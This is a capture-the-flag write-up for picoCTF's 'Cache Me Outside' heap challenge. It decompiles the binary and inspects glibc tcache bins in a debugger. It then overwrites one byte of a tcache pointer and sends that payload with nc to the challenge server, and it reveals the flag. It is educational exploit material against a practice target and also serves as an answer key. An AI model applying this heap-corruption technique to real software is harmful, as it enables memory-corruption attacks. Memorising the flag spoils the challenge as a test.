# Cache Me Outside
Category: Binary Exploitation, 70 points

## Description
> While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations.

a binary file, LibC file and makefile were attached.

## Running the Binary Locally

When we first try to run the binary locally, we get a segmentation fault:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ ./heapedit
zsh: segmentation fault  ./heapedit
```

This is because of incompatibility between our system and the provided libc.

We can work around this by downloading the correct linker ([pwninit](https://github.com/io12/pwninit) can do this automatically):

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ ls
flag.txt  heapedit  libc.so.6

┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ pwninit
bin: ./heapedit
libc: ./libc.so.6

fetching linker
writing solve.py stub

┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ ls
flag.txt  heapedit  ld-2.27.so  libc.so.6  solve.py
```

Now we can run the program using the following syntax:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ LD_PREALOAD=./libc.so.6 ./ld-2.27.so ./heapedit
You may edit one byte in the program.
Address:
```

We can even use `patchelf` to patch the executable so that it runs normally:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ patchelf  --set-interpreter ./ld-2.27.so ./heapedit

┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ ./heapedit
You may edit one byte in the program.
Address: 
```

## Solution

In this challenge we have a pretty artificial example of a heap exploit.

Let's start by inspecting Ghidra's decompilation output:

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined user_value;
  int user_address;
  int i;
  undefined8 *p_buf_first;
  undefined8 *p_buf;
  FILE *flag_fd;
  undefined8 *p_buf_last;
  void *local_80;
  char local_78 [32];
  char flag [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  flag_fd = fopen("flag.txt","r");
  fgets(flag,0x40,flag_fd);
  local_78._0_8_ = 0x2073692073696874; 
  local_78._8_8_ = 0x6d6f646e61722061;
  local_78._16_8_ = 0x2e676e6972747320;
  local_78[24] = '\0';
  p_buf_first = (undefined8 *)0x0;
  i = 0;
  while (i < 7) {
    p_buf = (undefined8 *)malloc(0x80);
    if (p_buf_first == (undefined8 *)0x0) {
      p_buf_first = p_buf;
    }
    *p_buf = 0x73746172676e6f43;
    p_buf[1] = 0x662072756f592021;
    p_buf[2] = 0x203a73692067616c;
    *(undefined *)(p_buf + 3) = 0;
    strcat((char *)p_buf,flag);
    i = i + 1;
  }
  p_buf_last = (undefined8 *)malloc(0x80);
  *p_buf_last = 0x5420217972726f53;
  p_buf_last[1] = 0x276e6f7720736968;
  p_buf_last[2] = 0x7920706c65682074;
  *(undefined4 *)(p_buf_last + 3) = 0x203a756f;
  *(undefined *)((long)p_buf_last + 0x1c) = 0;
  strcat((char *)p_buf_last,local_78);
  free(p_buf);
  free(p_buf_last);
  user_address = 0;
  user_value = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&user_address);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&user_value);
  *(undefined *)((long)user_address + (long)p_buf_first) = user_value;
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We can see that the program is allocating and freeing memory. It offers us to change one byte of memory somewhere, and using that we must print the flag.

If we dive in a bit deeper, we can see that the program:

1. (Allocates a buffer for the flag and reads the flag into it)
2. Allocates seven buffers, copies a string into them ("Congrats! Your flag is:"), concatenates the flag to each buffer, saves a pointer to the first buffer in `p_buf_first` and a pointer to the seventh buffer in `p_buf`.
3. Allocates another buffer, copies a string into it ("Sorry! This won't help you: this is a random string."), and saves a pointer to it in `p_buf_last`. I also appends another string to it.
4. Frees the seventh buffer, and the last buffer
5. Asks the user to change the value of one byte, relative to the first buffer
6. Allocates a new buffer and prints its contents (starting from offset 16)


We obviously need to change a value that will cause the print to print the flag.

We'll start by changing a meaningless address and see what happens. We'll choose offset `0` which is the beginning of the first buffer.

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ ./heapedit
You may edit one byte in the program.
Address: 0
Value: 0
t help you: this is a random string.
```

We get part of the already-freed `p_last_buffer` printed out. Why is that?

The reason is an optimization of the heap manager, which after seeing that `p_last_buffer` was freed, puts it in a special cache for freed allocations (`"tcache"`) in case anyone will want to allocate another buffer of the same size. This saves the heap manager some overhead, as explained nicely [here](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/). So, when we ask to allocate another 0x80 byte buffer, we get the last one that was freed.

We need to cause the heap manager to give us a different buffer instead - one that contains the flag.

Let's check the heap state by putting a breakpoint right before the first `free`.

```
gef>  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 66 61 6b 65 5f 66 6c 61    picoCTF{fake_fla]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
    [0x0000000000603800     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     53 6f 72 72 79 21 20 54 68 69 73 20 77 6f 6e 27    Sorry! This won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk
gef>  heap bins tcache
───────────────────────────────────────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcfc40 ─────────────────────────────────────────────────────────────────────────────────────
```

We can see all the allocated buffers, and none of them are in the `tcache`.

Now lets move until after both buffers are free, and reinspect:

```
gef>  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 66 61 6b 65 5f 66 6c 61    picoCTF{fake_fla]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk
gef>  heap bins tcache
───────────────────────────────────────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcfc40 ─────────────────────────────────────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
```

We can see that the `tcache` contains both freed chunks, and that the first chunk in its linked list is the one that says "This won't help you" - the one that we get back when we perform the final `malloc`. 

Now we need to find whoever is pointing to that buffer address, so that we can change it. We search for `0x603890` in the memory:

```
[+] Searching '\x90\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x90\x38\x60[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe240 - 0x7fffffffe24c  →   "\x90\x38\x60[...]"
```

We find two results. We probably need the one on the heap (`0x602088`). We just need to calculate it's relative offset from `p_buf_first`, which is the address that the program uses as the base offset for the value change.

```
gef>  p/d 0x602088 - 0x6034a0
$6 = -5144
```

We'll change the value at offset `-5144` to `0x0` in order to point to somewhere within the previous allocation:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Cache_Me_Outside/3]
└─$ { echo "-5144"; printf "\x00";} | nc mercury.picoctf.net 8054
You may edit one byte in the program.
Address: Value: lag is: picoCTF{5c9838eff837a883a30c38001280f07d}
```

The flag: `picoCTF{5c9838eff837a883a30c38001280f07d}`